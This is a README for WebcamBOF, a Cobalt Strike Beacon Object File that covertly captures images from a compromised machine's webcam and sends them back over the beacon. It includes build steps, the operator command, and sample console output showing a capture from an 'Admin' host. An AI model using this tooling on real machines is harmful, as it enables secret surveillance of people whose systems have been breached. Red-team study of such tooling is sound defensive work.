# WebcamBOF

Webcam capture capability for Cobalt Strike, implemented as a Beacon Object File (BOF)

## Self Compilation
1. git clone the repo
2. run `make`

## Save methods:  
0. drop file to disk
1. download file over beacon (Cobalt Strike only)
2. download file over beacon as a screenshot (Cobalt Strike only)

## Usage
1. import the webcamBOF.cna script into Cobalt Strike
2. use the command webcam_bof {filename} {save method 0/1/2}
  
```
beacon> webcam_bof sad.jpeg 2
[*] Running Webcam BOF by (@codex_tf2)
[+] host called home, sent: 35817 bytes
[+] received output:

[*] Initializing webcam
[+] received output:

[*] Device 0: HP 320 FHD Webcam
[+] received output:

[*] Capturing image data
[+] received output:
[*] Downloading JPEG over beacon as a screenshot
[*] received screenshot of Webcam from Admin (328kb)
```


## Notes
I'm gonna be honest, the code quality of this is pretty low. There is some hacky shit going on to prevent generation of COMDAT sections during compilation (the mfapi.h headers produced over 170 of them) and I did some absolutely illegal stuff with the function pointers in one of the functions becuase for some reason the addresses would get truncated ONLY when run in Beacon. It would work perfectly fine in COFFLoader. No idea why.

But it works.

## Why did I make this?
Cobalt Strike did not originally have a built in webcam capability, nor did open source alternatives exist to my knowledge. And it was a fun (not) idea.

## Credits
- Webcam code from https://github.com/OV2/WebcamImage
- Save BMP to file from https://stackoverflow.com/a/60667564
- in memory download from https://github.com/anthemtotheego/CredBandit
- bitmap to jpeg from https://github.com/WKL-Sec/HiddenDesktop

## Disclaimer
usual disclaimer here, I am not responsible for any crimes against humanity you may commit or nuclear war you may cause using this piece of poorly written code.
